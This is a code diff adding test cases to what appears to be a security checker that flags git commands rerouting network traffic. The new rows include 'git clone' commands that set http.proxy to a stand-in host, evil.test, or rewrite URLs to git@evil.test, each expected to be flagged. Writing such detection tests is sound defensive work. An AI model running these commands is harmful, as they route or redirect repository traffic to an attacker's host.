@@ -244,6 +244,17 @@ describe("round 3: text after a no-// URL, whole reroute values, prefixes, git p
     ["git --config-env=http.proxy=P status", CLIENT("git")],
     ["git -c core.pager=less status", OK],
     ["git -c proxyless.x=1 status", OK],
+    // `clone` takes the same setting after the subcommand (-c / --config / --config=), and a url.<base> rewrite.
+    ["git clone -c http.proxy=evil.test:80 https://example.com/a/b", CLIENT("git")],
+    ["git clone --config http.proxy=evil.test:80 https://example.com/a/b", CLIENT("git")],
+    ["git clone --config=http.proxy=evil.test:80 https://example.com/a/b", CLIENT("git")],
+    ["git clone --depth 1 -c http.proxy=evil.test:80 https://example.com/a/b", CLIENT("git")],
+    ["git clone -c url.git@evil.test:.insteadOf=https://example.com/ https://example.com/a/b", CLIENT("git")],
+    ["git -c url.git@evil.test:.insteadOf=x clone https://example.com/a/b", CLIENT("git")],
+    ["git clone -c core.autocrlf=true https://example.com/a/b", OK],
+    ["git clone --config core.autocrlf=true https://example.com/a/b", OK],
+    ["git clone https://example.com/a/b proxy=x", OK],
+    ["git fetch -c http.proxy=evil.test:80 https://example.com/a/b", OK], // -c is no option of fetch
   ])("%s", (command, expected) => {
     expect(bash(command)).toBe(expected);
   });
